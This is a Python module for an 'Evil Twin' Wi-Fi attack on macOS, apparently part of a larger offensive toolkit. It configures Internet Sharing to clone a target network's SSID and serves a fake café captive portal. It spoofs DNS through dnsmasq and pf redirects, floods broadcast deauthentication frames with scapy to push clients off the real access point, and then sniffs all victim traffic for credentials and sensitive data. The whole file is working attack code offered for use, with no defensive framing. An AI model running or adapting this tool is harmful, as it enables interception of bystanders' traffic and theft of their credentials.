"""
Evil Twin attack on macOS.

macOS limitation: only GUI System Settings can activate WiFi AP (SIP protection).
This tool automates everything AROUND that:
  1. Write Internet Sharing config (SSID, channel, password)
  2. Guide user to flip the toggle in System Settings
  3. Wait for ap1 to become active
  4. Auto-start: captive portal + deauth + NAT + MITM sniffing

Attack flow (WPA3 variant for open-network targets):
  - Real AP is open → macOS forces WPA3 on evil twin
  - Captive portal page shows WiFi password to victims
  - Deauth kicks clients off real AP → they see our AP, enter password
  - All traffic flows through us → full MITM, no AP isolation

Requirements:
  - macOS with ap1 interface (built-in, all modern Macs)
  - dnsmasq (brew install dnsmasq)
  - sudo access
"""

import os
import time
import plistlib
import subprocess
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from typing import Optional
from datetime import datetime

import click

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth,
        sendp, sniff,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ── Captive Portal HTML ──────────────────────────────────

CAPTIVE_PORTAL_HTML = """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{ssid} WiFi</title>
<style>
body{{font-family:-apple-system,sans-serif;background:#f5f0eb;margin:0;padding:20px}}
.c{{max-width:400px;margin:40px auto;background:#fff;border-radius:16px;padding:30px;
box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center}}
.logo{{font-size:28px;font-weight:700;color:#8B4513;margin-bottom:10px}}
.sub{{color:#666;font-size:14px;margin-bottom:25px}}
.box{{background:#FFF8F0;border:2px solid #D4A574;border-radius:12px;padding:20px;margin:20px 0}}
.lbl{{color:#8B4513;font-size:13px;margin-bottom:8px}}
.pwd{{font-size:24px;font-weight:700;color:#5C3310;letter-spacing:2px;user-select:all}}
.btn{{display:block;width:100%;padding:14px;background:#8B4513;color:#fff;border:none;
border-radius:10px;font-size:16px;cursor:pointer;margin-top:15px}}
.n{{color:#999;font-size:12px;margin-top:15px}}
</style></head><body>
<div class="c">
<div class="logo">☕ {ssid}</div>
<div class="sub">Welcome! Connect to our WiFi</div>
<div class="box">
<div class="lbl">WiFi Password</div>
<div class="pwd">{password}</div>
</div>
<a class="btn" href="http://connectivitycheck.gstatic.com/generate_204">Connect to Internet</a>
<div class="n">Free WiFi provided by {ssid}</div>
</div></body></html>"""


class CaptiveHandler(SimpleHTTPRequestHandler):
    """HTTP handler that serves captive portal for any request."""

    html_content = ""

    def do_GET(self):
        # Android/iOS captive portal detection endpoints
        captive_detect = [
            "/generate_204", "/gen_204", "/hotspot-detect.html",
            "/ncsi.txt", "/connecttest.txt", "/redirect",
            "/success.txt", "/canonical.html",
        ]
        if any(self.path.startswith(p) for p in captive_detect):
            # Return 302 redirect to our portal (triggers captive portal popup)
            self.send_response(302)
            self.send_header("Location", "http://portal.local/")
            self.end_headers()
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(self.html_content.encode())

    def do_POST(self):
        self.do_GET()

    def log_message(self, format, *args):
        pass  # Suppress HTTP logs


class EvilTwin:
    """Evil Twin AP attack for macOS."""

    def __init__(
        self,
        ssid: str,
        password: str = "highlands",
        channel: int = 36,
        ap_iface: str = "ap1",
        inet_iface: str = "en0",
        subnet: str = "192.168.44",
        bssid: Optional[str] = None,
        no_deauth: bool = False,
        captive: bool = True,
        portal_port: int = 80,
    ):
        self.ssid = ssid
        self.password = password
        self.channel = channel
        self.ap_iface = ap_iface
        self.inet_iface = inet_iface
        self.subnet = subnet
        self.bssid = bssid
        self.deauth = not no_deauth
        self.captive = captive
        self.portal_port = portal_port
        self.running = False

        self._dnsmasq_proc = None
        self._deauth_thread = None
        self._portal_thread = None
        self._portal_server = None

        self.our_ip = f"{self.subnet}.1"
        self.log_dir = f"./reports/evil_twin/{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    # ── Auto-detect network info ───────────────────────────

    @staticmethod
    def detect_network_info(inet_iface: str = "en0") -> dict:
        """Auto-detect gateway IP, BSSID (gateway MAC), and WiFi channel."""
        info = {"gateway_ip": None, "bssid": None, "channel": None, "ssid": None}

        # 1. Detect gateway IP from routing table
        try:
            result = subprocess.run(["netstat", "-nr"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                parts = line.split()
                if parts and parts[0] == "default" and len(parts) > 1 and "." in parts[1]:
                    info["gateway_ip"] = parts[1]
                    break
        except Exception:
            pass

        # 2. Get gateway MAC (= BSSID for router-integrated APs)
        if info["gateway_ip"]:
            try:
                result = subprocess.run(
                    ["arp", "-n", info["gateway_ip"]], capture_output=True, text=True
                )
                for line in result.stdout.splitlines():
                    if info["gateway_ip"] in line:
                        # Format: "? (10.x.x.x) at aa:bb:cc:dd:ee:ff on en0"
                        parts = line.split()
                        for p in parts:
                            if ":" in p and len(p) == 17:
                                info["bssid"] = p
                                break
            except Exception:
                pass

        # 3. Detect WiFi channel via CoreWLAN or system_profiler
        try:
            result = subprocess.run(
                ["system_profiler", "SPAirPortDataType"],
                capture_output=True, text=True, timeout=10,
            )
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Channel:"):
                    # "Channel: 60 (5GHz, 40MHz)"
                    ch_str = line.split(":")[1].strip().split()[0]
                    info["channel"] = int(ch_str)
                    break
        except Exception:
            pass

        # 4. Try to get SSID (may be redacted on macOS 15+)
        try:
            result = subprocess.run(
                ["networksetup", "-getairportnetwork", inet_iface],
                capture_output=True, text=True,
            )
            output = result.stdout.strip()
            if "Current Wi-Fi Network:" in output:
                info["ssid"] = output.split(":", 1)[1].strip()
        except Exception:
            pass

        return info

    def _sudo_cmd(self, cmd: str) -> subprocess.CompletedProcess:
        """Run shell command with sudo."""
        full = f"sudo {cmd}" if os.geteuid() != 0 else cmd
        return subprocess.run(full, shell=True, capture_output=True, text=True)

    # ── Step 1: Configure Internet Sharing ─────────────────

    def _configure_sharing(self):
        """Write macOS Internet Sharing plists so user only needs to flip toggle."""
        click.echo(click.style("  [1/5] Configuring Internet Sharing", fg="cyan"))

        # NAT plist
        nat_config = {
            "NAT": {
                "Enabled": True,
                "PrimaryInterface": {
                    "Device": self.inet_iface,
                    "Enabled": True,
                },
                "SharingDevices": [self.ap_iface],
            }
        }
        nat_path = "/Library/Preferences/SystemConfiguration/com.apple.nat.plist"
        tmp_nat = f"{self.log_dir}/nat.plist"
        with open(tmp_nat, "wb") as f:
            plistlib.dump(nat_config, f)
        self._sudo_cmd(f"cp {tmp_nat} {nat_path}")

        # WiFi sharing config
        wifi_config = {
            "WiFiNetworkName": self.ssid,
            "WiFiNetworkSecurity": 3,  # WPA3
            "WiFiNetworkChannel": self.channel,
            "WiFiNetworkPassword": self.password,
        }
        wifi_path = "/Library/Preferences/SystemConfiguration/com.apple.wifi.shareinternetservice.plist"
        tmp_wifi = f"{self.log_dir}/wifi_sharing.plist"
        with open(tmp_wifi, "wb") as f:
            plistlib.dump(wifi_config, f)
        self._sudo_cmd(f"cp {tmp_wifi} {wifi_path}")

        click.echo(click.style(f"    SSID:     {self.ssid}", fg="green"))
        click.echo(click.style(f"    Password: {self.password}", fg="green"))
        click.echo(click.style(f"    Channel:  {self.channel}", fg="green"))
        click.echo(click.style("    Security: WPA3", fg="green"))

    # ── Step 2: Wait for AP activation ─────────────────────

    def _wait_for_ap(self, timeout: int = 120) -> bool:
        """Wait for user to enable Internet Sharing in System Settings."""
        click.echo(click.style("\n  [2/5] Waiting for AP activation", fg="cyan"))
        click.echo(click.style(
            "\n  ╔══════════════════════════════════════════════════╗", fg="yellow", bold=True))
        click.echo(click.style(
            "  ║  Enable Internet Sharing in System Settings:    ║", fg="yellow", bold=True))
        click.echo(click.style(
            "  ║                                                  ║", fg="yellow"))
        click.echo(click.style(
            "  ║  Settings → General → Sharing                   ║", fg="yellow"))
        click.echo(click.style(
            "  ║  → Internet Sharing → toggle ON → Start         ║", fg="yellow"))
        click.echo(click.style(
            "  ║                                                  ║", fg="yellow"))
        click.echo(click.style(
            "  ║  Config already set:                             ║", fg="yellow"))
        click.echo(click.style(
            f"  ║    SSID: {self.ssid:<40} ║", fg="yellow"))
        click.echo(click.style(
            f"  ║    Pass: {self.password:<40} ║", fg="yellow"))
        click.echo(click.style(
            f"  ║    Chan: {self.channel:<40} ║", fg="yellow"))
        click.echo(click.style(
            "  ╚══════════════════════════════════════════════════╝\n", fg="yellow", bold=True))

        start = time.time()
        while time.time() - start < timeout:
            result = subprocess.run(
                ["ifconfig", self.ap_iface], capture_output=True, text=True
            )
            if "status: active" in result.stdout:
                # Get the actual AP IP
                for line in result.stdout.splitlines():
                    if "inet " in line:
                        parts = line.strip().split()
                        self.our_ip = parts[1]
                        # Derive subnet from AP IP
                        octets = self.our_ip.split(".")
                        self.subnet = ".".join(octets[:3])
                click.echo(click.style(f"  AP active! IP: {self.our_ip}", fg="green", bold=True))
                return True

            elapsed = int(time.time() - start)
            click.echo(f"\r  Waiting for ap1... ({elapsed}s / {timeout}s)", nl=False)
            time.sleep(2)

        click.echo(click.style("\n  Timeout waiting for AP activation", fg="red"))
        return False

    # ── Step 3: Captive Portal ─────────────────────────────

    def _start_captive_portal(self):
        """Start HTTP captive portal that shows WiFi password."""
        click.echo(click.style("  [3/5] Starting captive portal", fg="cyan"))

        html = CAPTIVE_PORTAL_HTML.format(
            ssid=self.ssid,
            password=self.password,
        )
        # Save portal page
        with open(f"{self.log_dir}/portal.html", "w") as f:
            f.write(html)

        CaptiveHandler.html_content = html

        try:
            self._portal_server = HTTPServer(("0.0.0.0", self.portal_port), CaptiveHandler)
            self._portal_thread = threading.Thread(
                target=self._portal_server.serve_forever, daemon=True
            )
            self._portal_thread.start()
            click.echo(click.style(
                f"    Portal: http://{self.our_ip}:{self.portal_port}", fg="green"))
        except OSError as e:
            if "Address already in use" in str(e):
                click.echo(click.style(
                    f"    Port {self.portal_port} busy, trying 8080", fg="yellow"))
                self.portal_port = 8080
                self._portal_server = HTTPServer(("0.0.0.0", self.portal_port), CaptiveHandler)
                self._portal_thread = threading.Thread(
                    target=self._portal_server.serve_forever, daemon=True
                )
                self._portal_thread.start()
                click.echo(click.style(
                    f"    Portal: http://{self.our_ip}:{self.portal_port}", fg="green"))
            else:
                click.echo(click.style(f"    Portal failed: {e}", fg="red"))

    # ── Step 4: DNS spoofing via dnsmasq ───────────────────

    def _start_dns_spoof(self):
        """Start dnsmasq to redirect captive portal detection to our portal."""
        click.echo(click.style("  [4/5] Starting DNS spoof (dnsmasq)", fg="cyan"))

        # Redirect captive portal detection domains to us
        # This triggers the "Sign in to WiFi" popup on iOS/Android
        captive_domains = [
            "connectivitycheck.gstatic.com",
            "clients3.google.com",
            "captive.apple.com",
            "www.apple.com",
            "detectportal.firefox.com",
            "www.msftconnecttest.com",
            "www.msftncsi.com",
            "portal.local",
        ]

        conf_lines = [
            "# Evil Twin DNS config",
            f"interface={self.ap_iface}",
            "bind-interfaces",
            "no-resolv",
            "server=8.8.8.8",
            "server=8.8.4.4",
            "log-queries",
            "log-dhcp",
            f"log-facility={self.log_dir}/dnsmasq.log",
        ]

        if self.captive:
            # Redirect captive detection domains to our portal IP
            for domain in captive_domains:
                conf_lines.append(f"address=/{domain}/{self.our_ip}")

        conf_path = f"{self.log_dir}/dnsmasq.conf"
        with open(conf_path, "w") as f:
            f.write("\n".join(conf_lines) + "\n")

        # Kill any existing dnsmasq
        self._sudo_cmd("pkill -f 'dnsmasq.*evil_twin' 2>/dev/null")
        time.sleep(0.5)

        self._dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", conf_path, "--no-daemon"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(1)

        if self._dnsmasq_proc.poll() is not None:
            err = self._dnsmasq_proc.stderr.read().decode()
            # dnsmasq may fail if Internet Sharing already runs its own DHCP
            # That's OK - we only need DNS spoofing
            click.echo(click.style(f"    dnsmasq note: {err[:200]}", fg="yellow"))
            click.echo(click.style(
                "    Internet Sharing handles DHCP — DNS spoof via pf redirect", fg="yellow"))
        else:
            click.echo(click.style("    DNS spoof active", fg="green"))

        # Also add pf rule to redirect DNS to our dnsmasq
        pf_rules = f"""
# Redirect DNS from evil twin clients to our dnsmasq
rdr on {self.ap_iface} proto udp from any to any port 53 -> {self.our_ip} port 53
rdr on {self.ap_iface} proto tcp from any to any port 53 -> {self.our_ip} port 53
# Redirect HTTP to captive portal
rdr on {self.ap_iface} proto tcp from any to any port 80 -> {self.our_ip} port {self.portal_port}
pass all
"""
        pf_path = f"{self.log_dir}/pf_evil.conf"
        with open(pf_path, "w") as f:
            f.write(pf_rules)
        self._sudo_cmd(f"pfctl -f {pf_path}")
        self._sudo_cmd("pfctl -e")
        click.echo(click.style("    pf redirect: DNS + HTTP → portal", fg="green"))

    # ── Step 5: Deauth ─────────────────────────────────────

    def _start_deauth(self):
        """Start deauth attack to kick clients off real AP."""
        if not self.deauth or not self.bssid:
            if not self.bssid:
                click.echo(click.style(
                    "  [5/5] Deauth skipped (no --bssid)", fg="yellow"))
            return

        if not HAS_SCAPY:
            click.echo(click.style("  [5/5] Deauth requires scapy!", fg="red"))
            return

        click.echo(click.style("  [5/5] Starting deauth attack", fg="cyan"))
        click.echo(f"    BSSID: {self.bssid}")

        def deauth_loop():
            while self.running:
                try:
                    pkt = (
                        RadioTap()
                        / Dot11(type=0, subtype=12,
                                addr1="ff:ff:ff:ff:ff:ff",
                                addr2=self.bssid,
                                addr3=self.bssid)
                        / Dot11Deauth(reason=7)
                    )
                    sendp(pkt, iface=self.inet_iface, count=3, inter=0.05, verbose=0)
                    time.sleep(0.5)
                except Exception as e:
                    click.echo(click.style(f"    Deauth error: {e}", fg="yellow"))
                    time.sleep(5)

        self._deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
        self._deauth_thread.start()
        click.echo(click.style("    Deauth active (broadcast)", fg="green"))

    # ── Traffic Sniffing ───────────────────────────────────

    def _sniff_traffic(self):
        """Sniff all traffic on evil AP — we ARE the gateway, no ARP spoof needed."""
        from hot_omelet.mitm import MITMInterceptor

        interceptor = MITMInterceptor(interface=self.ap_iface, log_dir=self.log_dir)
        interceptor.our_ip = self.our_ip
        interceptor.our_mac = "00:00:00:00:00:00"  # placeholder
        interceptor.stats = {
            "dns": 0, "http": 0, "credentials": 0, "tls_sni": 0,
            "ftp": 0, "smtp": 0, "sensitive_data": 0, "other": 0,
        }

        bpf = f"not host {self.our_ip}"
        click.echo(click.style(
            "\n  Sniffing all client traffic... (Ctrl+C to stop)\n",
            fg="yellow", bold=True,
        ))

        try:
            sniff(
                iface=self.ap_iface,
                filter=bpf,
                prn=interceptor._packet_handler,
                store=0,
                stop_filter=lambda _: not self.running,
            )
        except Exception as e:
            click.echo(f"  Sniff error: {e}")

    # ── Main ───────────────────────────────────────────────

    def start(self):
        """Full Evil Twin attack chain."""

        # Auto-detect BSSID and channel if not provided
        if not self.bssid or not self.channel:
            click.echo(click.style("  Scanning network...", fg="cyan"))
            net_info = self.detect_network_info(self.inet_iface)
            if not self.bssid and net_info["bssid"]:
                self.bssid = net_info["bssid"]
                click.echo(f"    Auto-detected BSSID: {self.bssid}")
            if net_info["channel"]:
                detected_ch = net_info["channel"]
                # Map to nearest macOS-allowed channel if needed
                allowed_5g = [36, 40, 44, 48]
                allowed_2g = [1, 6, 11]
                allowed = allowed_5g + allowed_2g
                if detected_ch not in allowed:
                    # Find nearest allowed channel in same band
                    if detected_ch > 14:  # 5GHz
                        nearest = min(allowed_5g, key=lambda x: abs(x - detected_ch))
                    else:
                        nearest = min(allowed_2g, key=lambda x: abs(x - detected_ch))
                    click.echo(f"    Real AP channel: {detected_ch} → using nearest allowed: {nearest}")
                    self.channel = nearest
                else:
                    self.channel = detected_ch
                    click.echo(f"    Auto-detected channel: {self.channel}")
            if net_info["gateway_ip"]:
                click.echo(f"    Gateway: {net_info['gateway_ip']}")

        click.echo(click.style("\n  ┌─ Evil Twin Attack ─┐", fg="red", bold=True))
        click.echo(f"  │ SSID:     {self.ssid}")
        click.echo(f"  │ Password: {self.password}")
        click.echo(f"  │ Channel:  {self.channel}")
        click.echo(f"  │ AP:       {self.ap_iface}")
        click.echo(f"  │ Net iface:{self.inet_iface}")
        click.echo(f"  │ Deauth:   {'ON → ' + self.bssid if self.deauth and self.bssid else 'OFF'}")
        click.echo(f"  │ Captive:  {'ON' if self.captive else 'OFF'}")
        click.echo(f"  │ Log:      {self.log_dir}")
        click.echo(click.style("  └──────────────────┘\n", fg="red", bold=True))

        self.running = True

        # Step 1: Write Internet Sharing config
        self._configure_sharing()

        # Step 2: Wait for user to enable in GUI
        if not self._wait_for_ap():
            self.stop()
            return

        # Step 3: Captive portal
        if self.captive:
            self._start_captive_portal()

        # Step 4: DNS spoof
        self._start_dns_spoof()

        # Step 5: Deauth
        self._start_deauth()

        # Sniff traffic (blocks until Ctrl+C)
        try:
            self._sniff_traffic()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        """Clean up everything."""
        click.echo(click.style("\n  Stopping Evil Twin...", fg="yellow"))
        self.running = False

        if self._portal_server:
            self._portal_server.shutdown()
            click.echo("    Captive portal stopped")

        if self._dnsmasq_proc and self._dnsmasq_proc.poll() is None:
            self._dnsmasq_proc.terminate()
            try:
                self._dnsmasq_proc.wait(timeout=3)
            except Exception:
                self._dnsmasq_proc.kill()
            click.echo("    dnsmasq stopped")

        self._sudo_cmd("pfctl -d")
        click.echo("    pf disabled")

        # Don't disable Internet Sharing — let user do that manually
        click.echo(click.style(
            "    NOTE: Disable Internet Sharing manually in System Settings",
            fg="yellow"))

        click.echo(click.style(f"\n  Logs: {self.log_dir}/", fg="cyan"))

        # Show dnsmasq log summary
        log_path = f"{self.log_dir}/dnsmasq.log"
        if os.path.exists(log_path):
            with open(log_path) as f:
                lines = f.readlines()
            dhcp_lines = [line for line in lines if "DHCPACK" in line or "DHCPOFFER" in line]
            if dhcp_lines:
                click.echo(click.style(f"  Clients connected ({len(dhcp_lines)}):", fg="green"))
                for line in dhcp_lines[:20]:
                    click.echo(f"    {line.strip()}")

        click.echo(click.style("  Evil Twin stopped.\n", fg="green"))


def evil_twin_command(
    ssid: str,
    channel: int,
    bssid: Optional[str],
    ap_iface: str,
    inet_iface: str,
    subnet: str,
    no_deauth: bool,
    captive: bool,
    password: str = "highlands",
):
    """Start Evil Twin attack."""
    twin = EvilTwin(
        ssid=ssid,
        password=password,
        channel=channel,
        ap_iface=ap_iface,
        inet_iface=inet_iface,
        subnet=subnet,
        bssid=bssid,
        no_deauth=no_deauth,
        captive=captive,
    )
    twin.start()
